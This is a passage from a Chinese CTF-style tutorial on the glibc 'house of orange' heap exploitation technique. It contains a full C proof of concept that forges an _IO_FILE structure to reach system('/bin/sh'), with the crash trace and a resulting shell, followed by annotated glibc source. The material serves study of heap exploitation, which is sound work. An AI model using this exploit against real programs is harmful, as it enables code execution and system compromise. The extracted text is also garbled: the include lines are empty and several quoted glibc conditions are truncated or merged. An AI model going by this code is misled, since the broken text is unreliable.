531
3.1.8 Linux 堆利用（三）
gef➤ x/8gx a-0x10
0x603000: 0x0000000000000000 0x0000000000000021 
#include 
532
3.1.8 Linux 堆利用（三）
#include 
int winner (char *ptr);
int main() {
char *p1, *p2;
size_t io_list_all, *top;
p1 = malloc(0x400 - 0x10);
top = (size_t *) ((char *) p1 + 0x400 - 0x10);
top[1] = 0xc01;
p2 = malloc(0x1000);
io_list_all = top[2] + 0x9a8;
top[3] = io_list_all - 0x10;
memcpy((char *) top, "/bin/sh\x00", 8);
top[1] = 0x61;
_IO_FILE *fp = (_IO_FILE *) top;
fp->_mode = 0; // top+0xc0
fp->_IO_write_base = (char *) 2; // top+0x20
fp->_IO_write_ptr = (char *) 3; // top+0x28
size_t *jump_table = &top[12]; // controlled memory
jump_table[3] = (size_t) &winner;
*(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump
_table; // top+0xd8
malloc(1);
return 0;
}
int winner(char *ptr) {
system(ptr);
return 0;
}
533
3.1.8 Linux 堆利用（三）
$ gcc -g house_of_orange.c
$ ./a.out
*** Error in `./a.out': malloc(): memory corruption: 0x00007f3da
ece3520 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f3dae9957e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7f3dae9a013e]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f3dae9a21
84]
./a.out[0x4006cc]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f3dae
93e830]
./a.out[0x400509]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 919342
/home/firmy/how2heap/a.out
00600000-00601000 r--p 00000000 08:01 919342
/home/firmy/how2heap/a.out
00601000-00602000 rw-p 00001000 08:01 919342
/home/firmy/how2heap/a.out
01e81000-01ec4000 rw-p 00000000 00:00 0
[heap]
7f3da8000000-7f3da8021000 rw-p 00000000 00:00 0
7f3da8021000-7f3dac000000 ---p 00000000 00:00 0
7f3dae708000-7f3dae71e000 r-xp 00000000 08:01 398989
/lib/x86_64-linux-gnu/libgcc_s.so.1
7f3dae71e000-7f3dae91d000 ---p 00016000 08:01 398989
/lib/x86_64-linux-gnu/libgcc_s.so.1
7f3dae91d000-7f3dae91e000 rw-p 00015000 08:01 398989
/lib/x86_64-linux-gnu/libgcc_s.so.1
7f3dae91e000-7f3daeade000 r-xp 00000000 08:01 436912
/lib/x86_64-linux-gnu/libc-2.23.so
7f3daeade000-7f3daecde000 ---p 001c0000 08:01 436912
/lib/x86_64-linux-gnu/libc-2.23.so
7f3daecde000-7f3daece2000 r--p 001c0000 08:01 436912
/lib/x86_64-linux-gnu/libc-2.23.so
7f3daece2000-7f3daece4000 rw-p 001c4000 08:01 436912
/lib/x86_64-linux-gnu/libc-2.23.so
7f3daece4000-7f3daece8000 rw-p 00000000 00:00 0
7f3daece8000-7f3daed0e000 r-xp 00000000 08:01 436908
534
3.1.8 Linux 堆利用（三）
/lib/x86_64-linux-gnu/ld-2.23.so
7f3daeef4000-7f3daeef7000 rw-p 00000000 00:00 0
7f3daef0c000-7f3daef0d000 rw-p 00000000 00:00 0
7f3daef0d000-7f3daef0e000 r--p 00025000 08:01 436908
/lib/x86_64-linux-gnu/ld-2.23.so
7f3daef0e000-7f3daef0f000 rw-p 00026000 08:01 436908
/lib/x86_64-linux-gnu/ld-2.23.so
7f3daef0f000-7f3daef10000 rw-p 00000000 00:00 0
7ffe8eba6000-7ffe8ebc7000 rw-p 00000000 00:00 0
[stack]
7ffe8ebee000-7ffe8ebf1000 r--p 00000000 00:00 0
[vvar]
7ffe8ebf1000-7ffe8ebf3000 r-xp 00000000 00:00 0
[vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0
[vsyscall]
$ whoami
firmy
$ exit
Aborted (core dumped)
house-of-orange 是一种利用堆溢出修改 _IO_list_all 指针的利用方法。它要
求能够泄漏堆和 libc。我们知道一开始的时候，整个堆都属于 top chunk，每次申请
内存时，就从 top chunk 中划出请求大小的堆块返回给用户，于是 top chunk 就越
来越小。
当某一次 top chunk 的剩余大小已经不能够满足请求时，就会调用函数
sysmalloc() 分配新内存，这时可能会发生两种情况，一种是直接扩充 top
chunk，另一种是调用 mmap 分配一块新的 top chunk。具体调用哪一种方法是由
申请大小决定的，为了能够使用前一种扩展 top chunk，需要请求小于阀值
mp_.mmap_threshold ：
if (av == NULL
|| ((unsigned long) (nb) >= (unsigned long) (mp_.mmap_thre
shold)
&& (mp_.n_mmaps = MINSIZE)
{
_int_free (av, old_top, 1);
}
当然，还得绕过下面两个限制条件：
/*
If not the first time through, we require old_size to be
at least MINSIZE and to have prev_inuse set.
*/
assert ((old_top == initial_top (av) && old_size == 0) ||
((unsigned long) (old_size) >= MINSIZE &&
prev_inuse (old_top) &&
((unsigned long) old_end & (pagesize - 1)) == 0));
/* Precondition: not enough current space to satisfy nb reques
t */
assert ((unsigned long) (old_size) size
=
(2 * SIZE_SZ) | PREV_INUSE;
chunk_at_offset (old_top, old_size + 2 * S
IZE_SZ)->size =
(2 * SIZE_SZ) | PREV_INUSE;
/* If possible, release the rest. */
if (old_size >= MINSIZE)
{
_int_free (av, old_top, 1);
}
}
539
3.1.8 Linux 堆利用（三）
根据放入 unsorted bin 中 old top chunk 的 fd/bk 指针，可以推算出
_IO_list_all 的地址。然后通过溢出将 old top 的 bk 改写为 _IO_list_all-
0x10 ，这样在进行 unsorted bin attack 时，就会将 _IO_list_all 修改为
&unsorted_bin-0x10 ：
/* remove from unsorted list */
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
gef➤ x/4gx p1-0x10+0x400
0x602400: 0x0000000000000000 0x0000000000000be1
0x602410: 0x00007ffff7dd1b78 0x00007ffff7dd2510
这里讲一下 glibc 中的异常处理。一般在出现内存错误时，会调用函数
malloc_printerr() 打印出错信息，我们顺着代码一直跟踪下去：
540
3.1.8 Linux 堆利用（三）
static void
malloc_printerr (int action, const char *str, void *ptr, mstate
ar_ptr)
{
[...]
if ((action & 5) == 5)
__libc_message (action & 2, "%s\n", str);
else if (action & 1)
{
char buf[2 * sizeof (uintptr_t) + 1];
buf[sizeof (buf) - 1] = '\0';
char *cp = _itoa_word ((uintptr_t) ptr, &buf[sizeof (buf)
- 1], 16, 0);
while (cp > buf)